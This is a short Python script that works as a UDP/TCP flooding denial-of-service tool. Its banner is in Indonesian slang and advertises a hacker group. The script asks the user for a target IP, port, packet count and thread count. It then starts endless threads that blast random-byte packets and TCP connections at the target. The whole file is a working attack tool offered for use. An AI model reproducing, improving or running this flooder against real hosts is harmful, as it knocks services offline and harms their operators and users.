import random
import socket
import threading

print       (" - - > Lord Pemula Ni Dek!! < - - ")
print       (" - - > Tolls By Lord!!!! < - - ")
print       (" - - > Join Xall Team <- - ")                                   
print       (" - - > Rename Pm Gw !! < - - ")
print       (" - - > Xalbador Community  < - - ")
print       (" - - > Tuh link nya Join!! < - - ")
print       (" - - >  How Are You Ready?  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Send!!! ")
		except:
			print("[!] Send!!! ")

def run2():
	data = random._urandom(1800)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send!!! ")
		except:
			s.close()
			print("[*] Send!!! ")
            
def run3():
	data = random._urandom(1400)
	i = random.choice(("[+]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send!!! ")
		except:
			s.close()
			print("[*] Send!!! ")
            

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
